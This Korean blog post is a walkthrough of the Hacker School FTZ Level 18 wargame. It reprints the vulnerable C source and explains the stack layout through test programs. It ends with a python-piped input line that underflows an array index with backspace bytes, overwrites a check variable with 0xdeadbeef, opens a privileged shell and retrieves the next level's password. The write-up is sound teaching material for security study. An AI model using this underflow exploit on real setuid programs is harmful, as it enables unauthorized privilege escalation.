---
layout: post
title: "Hacker School FTZ - Level 18"
description: "Do you know the ?"
comments: true
categories: ftz
---

<img data-action="zoom" src='{{ "assets/ftz/level18/1.jpg" | relative_url }}' alt='relative'>  

## 1) level18/why did you do it 입력해 로그인  
 
``` c
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
void shellout(void);
int main()
{
  char string[100];
  int check;
  int x = 0;
  int count = 0;
  fd_set fds;
  printf("Enter your command: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 100)
        printf("what are you trying to do?\n");
      if(check == 0xdeadbeef)
        shellout();
      else
        {
          FD_ZERO(&fds);
          FD_SET(STDIN_FILENO,&fds);

          if(select(FD_SETSIZE, &fds, NULL, NULL, NULL) >= 1)
            {
              if(FD_ISSET(fileno(stdin),&fds))
                {
                  read(fileno(stdin),&x,1);
                  switch(x)
                    {
                      case '\r':
                      case '\n':
                        printf("\a");
                        break;
                      case 0x08:
                        count--;
                        printf("\b \b");
                        break;
                      default:
                        string[count] = x;
                        count++;
                        break;
                    }
                }
            }
        }
    }
}

void shellout(void)
{
  setreuid(3099,3099);
  execl("/bin/sh","sh",NULL);
}
```

<img data-action="zoom" src='{{ "assets/ftz/level18/2.png" | relative_url }}' alt='relative'>  

코드를 살펴보면,  
1. count 변수는 string 배열의 인덱스 번호를 저장  
2. 변수가 스택에 쌓이는 순서는  

<img data-action="zoom" src='{{ "assets/ftz/level18/3.png" | relative_url }}' alt='relative'>  

3. check 변수에 0xdeadbeef 값을 넣어줘야 함  
4. 입력 방법으로는 string 배열에 표준입력으로 문자 한 개씩 입력 받음  

코드 내용을 분석한 결과 string 배열을 넘어서서 check 변수에 값을 대입해야 하는 걸로 보입니다.  
string\[count\] = x 코드는 string\[count\] 값이 가리키는 주소에 x 값을 입력하라는 의미입니다.  

그러면 string 배열의 BOF를 일으켜 x에는 0xdeadbeef 값을 넣어주고 string\[count\]는 check를 가리키도록 해야 합니다.  

## 2) string\[count\]가 check를 가리키는 방법  

<img data-action="zoom" src='{{ "assets/ftz/level18/4.png" | relative_url }}' alt='relative'>  

``` c
// test.c
#include <stdio.h>
int main() {
        int i;
        char var1 = 'b';
        char var[10] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
        char var2 = 'a';
        char var3 = 'c';

        printf("*var = %c\n", *var);

        for (i=0; i<10; i++)
                printf("*var+%d = %c\n", i, *var+i);

        printf("var[-1] = %c\n", var[-1]);
        printf("var[10] = %c\n", var[10]);
        printf("var[-2] = %c\n", var[-2]);

        return 0;
}
```

위의 소스코드를 실행하면 어떤 값을 출력할까요?  

<img data-action="zoom" src='{{ "assets/ftz/level18/5.png" | relative_url }}' alt='relative'>  

var\[-1\]이 가리키는 주소에 들어있는 값을 출력하니 'a'가 출력되었습니다.  

<img data-action="zoom" src='{{ "assets/ftz/level18/6.png" | relative_url }}' alt='relative'>  

gdb로 test 실행파일을 살펴보니 아래 그림처럼 변수가 스택에 저장되어 있습니다.  

배열의 값이 스택에 쌓이는 순서는 스택의 낮은 주소부터 높은 주소로 순서대로 쌓이며,  
변수가 스택에 쌓이는 순서는 마지막에 선언된 변수부터 처음 선언된 변수 순서대로 쌓이는 것을 확인할 수 있습니다.  

<img data-action="zoom" src='{{ "assets/ftz/level18/7.png" | relative_url }}' alt='relative'>  

그래서 var\[-1\]은 \*var-1을 의미하여 var2 변수에 들어있는 값이 출력된 것 입니다.  

<hr>

앞서 살펴본 내용을 고려하면 string\[count\]가 check를 가리키기 위해선 count가 -1 값을 가지고 있으면 됩니다.  

count는 초기값이 0이므로 0x08을 입력하면 -1이 될 것입니다.  

## 3) 0x08 입력하여 0xdeadbeef 값 입력하기  

char 배열은 문자 하나를 읽기 위해 1 byte씩 주소를 이동합니다. (만약 int 배열이었으면 이와 같은 이유로 정수 하나를 읽기 위해 4 byte씩 주소를 이동합니다.)  
따라서 char 배열의 인덱스가 int 변수 하나에 값을 넣기 위해서는 4번의 주소 이동이 있어야 합니다.  

또한, 리틀 엔디안 형식으로 값을 넣어줘야 하기 때문에 0xdeadbeef를 한 바이트씩 잘라 '\xef', '\xbe', '\xad', '\xde' 순으로 넣어줘야 합니다.  

<img data-action="zoom" src='{{ "assets/ftz/level18/8.png" | relative_url }}' alt='relative'>  

``` c
#include <stdio.h>
int main() {
        char tmp[10] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
        int atme;
        int count = -1;

        tmp[count-3] = 0xef;
        tmp[count-2] = 0xbe;
        tmp[count-1] = 0xad;
        tmp[count-0] = 0xde;

        if (atme == 0xdeadbeef)
                printf("good");

        return 0;
}
```

<img data-action="zoom" src='{{ "assets/ftz/level18/9.png" | relative_url }}' alt='relative'>  

tmp 문자열 배열보다 atme 정수형 변수가 스택에 먼저 쌓여 스택에서 더 낮은 주소에 위치하고 있습니다.  
따라서 tmp 문자열 배열의 인덱스가 스택의 더 낮은 주소를 가리키면 atme 변수를 가리킬 수 있습니다.  

또한, atme 정수형 변수는 4 byte이므로 문자열 배열인 tmp는 4 byte 뒤로 이동하여 1 byte씩 원하는 값을 입력해야 하고,  
리틀 엔디안 형식으로 값을 입력해야 하므로 입력하고자 하는 값을 한 바이트씩 잘라 뒤에서부터 입력해줍니다.  

그러면 위와 같이 atme 변수에 0xdeadbeef 값이 들어가 good 문자열을 출력하는 걸 볼 수 있습니다.  

## 4) attackme에 적용하기  

3번의 내용을 바로 attackme에 적용하면,  

``` bash
(python -c 'print "\x08"*4+"\xef\xbe\xad\xde"'; cat) | ./attackme
```

<img data-action="zoom" src='{{ "assets/ftz/level18/10.png" | relative_url }}' alt='relative'>  

level19의 비밀번호를 획득할 수 있습니다.  